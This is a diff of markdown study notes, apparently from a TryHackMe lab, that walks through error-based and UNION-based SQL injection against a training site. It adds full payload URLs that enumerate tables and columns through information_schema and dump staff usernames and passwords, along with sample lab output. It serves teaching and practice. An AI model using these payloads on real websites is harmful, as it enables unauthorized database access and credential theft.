@@ -284,64 +284,111 @@ SELECT * from blog where id=2;--
 * This can often be used to enumerate a whole database. 
 
 ### Error-Based SQLi Example
-* 
+* Blog URL is still `https://website.thm/article?id=1`
 * The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced.
 * These are most commonly single apostrophes `'` or a quotation mark `"`.
-* Type an apostrophe `'` after the `id=1` and press enter.
-* This returns an SQL error informing of an error in the syntax.
+* Type an apostrophe `'` after the `id=1` and press enter:
+```
+`https://website.thm/article?id=1'`
+```
+* This returns an SQL error informing of an error in the syntax:
+```
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+```
 * The fact that this error message has been received confirms the existence of an SQL Injection vulnerability.
 * Can now exploit this vulnerability and use the error messages to learn more about the database structure.
 * The first thing to do is return data to the browser without displaying an error message.
 * Try the `UNION` operator to receive an extra result. Try setting the browsers `id` parameter to:
 ```
-1 UNION SELECT 1
+https://website.thm/article?id=1 UNION SELECT 1
 ```
-* This statement produces an error message informingu that the `UNION SELECT` statement has a different number of columns than the original `SELECT` query.
-* Try again but add another column:
+* This statement produces an error message informingu that the `UNION SELECT` statement has a different number of columns than the original `SELECT` query:
 ```
-1 UNION SELECT 1,2
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+```
+* Try again, adding another column:
+```
+https://website.thm/article?id=1 UNION SELECT 1,2
 ```
 * Same error.
 * Repeat by adding another column:
 ```
-1 UNION SELECT 1,2,3
+https://website.thm/article?id=1 UNION SELECT 1,2,3
 ```
-* Success, the error message has gone, and the article is being displayed.
+* Success, the error message has gone, and the article is being displayed:
+```
+My First Article
+
+Article ID: 1
+Hi and welcome to my very first article for my new website......
+```
 * Nnow the goal is to display data instead of the article.
 * The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that.
-* To get around this the first query must produce no results.
-* This can simply be done by changing the article `id` from `1` to `0`.
+* To get around this, the first query must produce no results.
+* This can be done by changing the article `id` from `1` to `0`.
 ```
-0 UNION SELECT 1,2,3
+https://website.thm/article?id=0 UNION SELECT 1,2,3
 ```
-* The article is just made up of the result from the `UNION` select returning the column values 1, 2, and 3.
-* Start using these returned values to retrieve more useful information.
+* The article is just made up of the result from the `UNION` select returning the column values 1, 2, and 3:
+```
+2
+
+Article ID: 1
+3
+```
+* Use the returned values to retrieve more useful information.
 * Get the database name:
 ```
-0 UNION SELECT 1,2,database()
+https://website.thm/article?id=0 UNION SELECT 1,2,database()
 ```
-* Where the number 3 was previously displayed; it now shows the name of the database, which is `sqli_one`.
-* Next query will gather a list of tables that are in this database.
+* Where the number 3 was previously displayed; it now shows the name of the database, which is `sqli_one`:
 ```
-0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+2
+
+Article ID: 1
+sqli_one
+```
+* Now gather a list of tables that are in this database.
+```
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
 ```
 * The method `group_concat()` gets the specified column (in this case, `table_name`) from multiple returned rows and puts it into one string separated by commas.
 * Every user of the database has access to the `information_schema` database and it contains information about all the databases and tables the user has access to.
-* In this particular query, the goal is to list all the tables in the `sqli_one` database, which are `article` and `staff_users`.
-* As the first level aims to discover Martin's password, the `staff_users` table is what is of interest.
+* In this particular query, the goal is to list all the tables in the `sqli_one` database, which are `article` and `staff_users`:
+```
+2
+
+Article ID: 1
+article,staff_users
+```
+* The aim is to discover Martin's password so the `staff_users` table is what is of interest.
 * Utilise the `information_schema` database again to find the structure of this table using the query:
 ```
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
 ```
 * The information to retrieve has changed from `table_name` to `column_name`, the table being queried in the `information_schema` database has changed from `tables` to `columns`, and rows are being searched where the `table_name` column has a value of `staff_users`.
-* The query results provide three columns for the `staff_users` table: `id`, `password`, and `username`.
-* Use the `username` and `password` columns for our following query to retrieve the user's information.
+* The query results provide three columns for the `staff_users` table: `id`, `password`, and `username`:
+```
+2
+
+Article ID: 1
+id,username,password
+```
+* Use the `username` and `password` columns for the next query to retrieve the user's information:
 ```
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
 ```
 * Use the `group_concat` method to return all of the rows into one string and to make it easier to read.
 * Add `,':',` to split the username and password from each other.
 * Use the HTML `<br` tag that forces each result to be on a separate line to make for easier reading instead of being separated by a comma.
+```
+2
+
+Article ID: 1
+admin:p4ssword
+martin:pa$$word
+jim:work123
+```
 
 ### Union-Based SQL Injection
 * Utilises the SQL `UNION` operator alongside a `SELECT` statement to return additional results to the page.
